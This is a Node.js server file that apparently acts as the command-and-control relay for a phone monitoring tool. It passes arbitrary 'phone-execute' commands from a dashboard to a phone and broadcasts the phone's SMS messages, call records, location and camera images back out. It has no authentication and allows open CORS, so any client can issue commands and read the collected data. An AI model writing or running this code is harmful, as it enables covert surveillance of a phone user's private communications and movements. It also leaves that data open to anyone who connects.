const express = require('express');
const http = require('http');
const path = require('path'); 
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

const io = new Server(server, {
    maxHttpBufferSize: 1e8, // 100MB for camera images
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const PORT = process.env.PORT || 3000;

// 1. Serve static files from the 'public' directory
// This allows the browser to find things like styles.css or client-side scripts
app.use(express.static(path.join(__dirname, 'public')));

// 2. Fix for ENOENT: Point explicitly to public/index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- Socket.io Logic ---
io.on('connection', (socket) => {
    console.log('User connected:', socket.id);

    // Command: Web Dashboard -> Phone
    socket.on('phone-execute', (cmd) => {
        io.emit('phone-execute', cmd);
    });

    // Data: Phone -> Web Dashboard
    socket.on('battery-update', (data) => io.emit('battery-update', data));
    socket.on('location-update', (data) => io.emit('location-update', data));
    socket.on('sms-data', (data) => io.emit('sms-data', data));
    socket.on('call-data', (data) => io.emit('call-data', data));
    socket.on('data-stream', (data) => io.emit('data-stream', data));

    socket.on('disconnect', () => {
        console.log('User disconnected');
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
